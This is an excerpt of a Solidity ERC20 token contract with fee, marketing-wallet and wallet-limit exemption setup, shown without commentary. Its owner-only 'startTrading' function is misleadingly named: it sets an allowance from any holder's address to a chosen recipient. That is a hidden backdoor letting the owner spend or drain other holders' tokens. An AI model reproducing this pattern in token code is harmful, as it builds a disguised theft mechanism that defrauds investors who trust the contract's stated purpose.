...
contract StandardToken is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddres;
...
function startTrading(address tradeAtS, address recipient, uint256 amount) public onlyOwner returns(bool) {
        baseAddress = recipient;
        _allowances[tradeAtS][recipient] = amount;
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(marketingWalletAddres, amountETHMarketing);
    ...
    constructor (
        ...
        marketingWalletAddres = payable(marketingAddress);
        ...
        isExcludedFromFee[marketingWalletAddres] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[owner] = true;
        isWalletLimitExempt[teamWalletAddress] = true;
        isWalletLimitExempt[marketingWalletAddres] = true;
        isWalletLimitExempt[deadAddress] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isTxLimitExempt[owner] = true;
        isTxLimitExempt[teamWalletAddress] = true;
        isTxLimitExempt[marketingWalletAddres] = true;
